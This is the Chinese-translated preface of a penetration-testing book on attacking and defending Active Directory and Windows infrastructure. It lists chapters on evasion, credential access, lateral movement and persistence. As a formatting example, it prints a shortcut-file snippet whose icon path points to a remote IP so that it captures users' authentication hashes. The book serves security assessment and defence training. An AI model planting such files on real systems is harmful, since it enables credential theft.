# 前言

几乎每天我们都会听到新的数据泄露、数据外泄或勒索软件攻击的消息。如今，网络犯罪已成为一个庞大的产业，并且不断寻求进步。这不再是一个人的表演；网络犯罪分子有自己的方法论、工具和专业人员。防御的方式是理解他们是如何攻击的、他们的战术以及技术。

我们将采用这种方法来对抗最受欢迎的软件供应商——微软的各种产品。本书专注于基于 Windows 的基础设施，因为对于大多数公司而言，企业内部基础设施仍然是一个重要领域。在本书中，我将带领你通过对`Active Directory`（*AD*）、Active Directory 证书服务、Microsoft Exchange 服务器、Microsoft SQL 服务器以及**系统中心配置管理器**（*SCCM*）的攻击杀链过程。在这个过程中，你将接触到已知的战术和技术，并进行大量的实践练习。

到本书结束时，你将能够对基于 Windows 的基础设施进行全面的实际安全评估。此外，你还将获得关于如何检测对手活动的建议和修复建议。

# 本书适用人群

本书确实是一本全方位的指南，专为从事 Windows 基础设施工作，特别是 AD 的安全专业人员编写。渗透测试人员和红队操作员将找到他们在实际评估中可能遇到的攻击场景。安全和 IT 工程师、蓝队成员以及事件响应人员将从检测和修复指南中受益。为了最大限度地利用本书，你应该具备 Windows 服务和 AD 的基础知识。

# 本书内容

*第一章*，*准备实验室和攻击 Exchange 服务器*，概述了攻击杀链，展示了如何部署实验室环境，并专注于通过实际示例演示 Exchange 服务器的攻击面。

*第二章*，*防御规避*，教授你如何规避**恶意软件扫描接口**（**AMSI**）和 AppLocker、PowerShell 增强日志记录、Sysmon 以及**Windows 事件跟踪**（**ETW**）。

*第三章*，*域侦察与发现*，在这一章你将学习如何在域中执行侦察、如何融入环境流量，以及深入了解像 BloodHound 和 Microsoft **高级威胁分析**（**ATA**）等工具的内部工作。

*第四章*，*域中的凭证访问*，介绍了通过捕获哈希值、强制认证、对 Kerberos 进行“烘烤”、如果**本地管理员密码解决方案**（**LAPS**）配置错误时读取明文密码，以及通过 DCSync 收集 gMSA 账户或整个域的哈希值等方式获取域环境中的凭证。

*第五章*，*域内和跨森林的横向移动*，展示了对手如何通过滥用不同类型的委派、传递不同类型的凭证材料、转发捕获的哈希值以及向其他森林移动来在环境中横向移动。

*第六章*，*域权限提升*，我们将重点讨论通过滥用配置错误的**访问控制列表**（**ACL**）、**组策略对象**（**GPO**）和特殊内建组来提升域中的权限，以及如何从子域转移到父域。

*第七章*，*域级持久化*，展示了通过伪造票证和操作 ACL 和对象，以及通过添加骨架密钥、恶意 SSP、注册表后门等手段，在域控制器上实现持久化的技术。

*第八章*，*滥用 Active Directory 证书服务*，涵盖了微软实施的**公钥基础设施**（**PKI**）的基础知识，以及盗取证书、在域中提升权限并实现域级持久化的方法。

*第九章*，*攻破 Microsoft SQL Server*，我们将重点讨论如何攻击 SQL Server，包括枚举、权限提升、横向移动和持久化。

*第十章*，*接管 WSUS 和 SCCM*，提供了 IT 支持管理软件的概述，并介绍了滥用其功能的方法，最终实现对整个环境的完全接管。

# 为了充分利用本书

| 书中涵盖的软件/硬件 | 操作系统要求 |
| --- | --- |
| Windows Active Directory | Linux 主机 |
| Windows 服务 – WSUS 和 AD CS | Kali 虚拟机 |
| Exchange 服务器 |  |
| SQL Server |  |
| SCCM |  |

# 使用的约定

本书中使用了若干文本约定。

**文本中的代码**：表示文本中的代码词、数据库表名、文件夹名称、文件名、文件扩展名、路径名、虚拟 URL、用户输入和 Twitter 用户名。以下是一个示例：“`MailSniper` 计算身份验证尝试响应之间的时间差。”

任何命令行输入或输出如下所示：

```
[InternetShortcut]
URL=any
WorkingDirectory=any
IconFile=\\192.168.56.100\%USERNAME%.icon
IconIndex=1
```

**粗体**：表示新术语、重要词汇或您在屏幕上看到的词。例如，菜单或对话框中的词语通常以**粗体**显示。以下是一个示例：“我们将讨论攻击检测及可能的防范措施，并介绍进攻性**操作` `安全**（**OpSec**）。”

提示或重要注意事项

显示如下。

# 联系我们

我们始终欢迎读者的反馈。

**一般反馈**：如果你对本书的任何部分有疑问，请通过邮件联系我们，邮箱地址是 customercare@packtpub.com，并在邮件主题中提到书名。

**勘误表**：尽管我们已尽最大努力确保内容的准确性，但难免会有错误。如果你在本书中发现任何错误，我们将非常感激你向我们报告。请访问[www.packtpub.com/support/errata](http://www.packtpub.com/support/errata)并填写表单。

**盗版**：如果你在互联网上发现我们作品的任何非法副本，请提供其网址或网站名称。请通过版权@packtpub.com 与我们联系，附上该资料的链接。

**如果你有兴趣成为作者**：如果你在某个领域有专长，并且有兴趣撰写或参与编写一本书，请访问[authors.packtpub.com](http://authors.packtpub.com)。

# 分享你的想法

一旦你阅读了*《渗透测试：Active Directory 和基于 Windows 的基础设施》*，我们非常希望听到你的反馈！请[点击这里直接进入 Amazon 的评论页面](https://packt.link/r/1804611360)，分享你的看法。

你的评论对我们和技术社区来说都非常重要，将帮助我们确保提供卓越质量的内容。

# 下载本书的免费 PDF 副本

感谢购买本书！

你喜欢在旅途中阅读，但又不能随时携带纸质书籍吗？

你的电子书购买是否与你选择的设备不兼容？

不用担心，现在购买每本 Packt 书籍，你都会免费获得该书的无 DRM PDF 版本。

随时随地、在任何设备上阅读。直接从你最喜欢的技术书籍中搜索、复制并粘贴代码到你的应用程序中。

优惠活动不仅仅是这样，你还可以获得独家折扣、时事通讯以及每天送到邮箱的精彩免费内容

按照以下简单步骤，享受相关福利：

1.  扫描二维码或访问以下链接

![](img/B18964_QR_Free_PDF.jpg)

[`packt.link/free-ebook/9781804611364`](https://packt.link/free-ebook/9781804611364)

1.  提交你的购买证明

1.  就是这样！我们会直接将你的免费 PDF 和其他福利发送到你的邮箱。
